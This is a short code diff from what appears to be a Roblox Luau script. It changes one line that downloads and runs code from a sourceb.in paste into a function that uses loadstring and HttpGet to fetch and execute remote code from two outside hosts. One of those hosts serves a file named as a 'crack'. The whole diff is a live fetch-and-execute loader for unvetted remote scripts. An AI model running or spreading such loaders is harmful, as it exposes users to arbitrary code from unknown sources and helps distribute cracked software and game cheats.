@@ -1,1 +1,6 @@
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/NbAcTHZXOn/0", true))()
+local function f1(a)
+  loadstring(game:HttpGet(a))()
+end
+
+task.spawn(f1, "https://cdn.sourceb.in/bins/NbAcTHZXOn/0")
+task.spawn(f1, "https://cdn.project-reverse.org/odh_3_5_crack.luau")
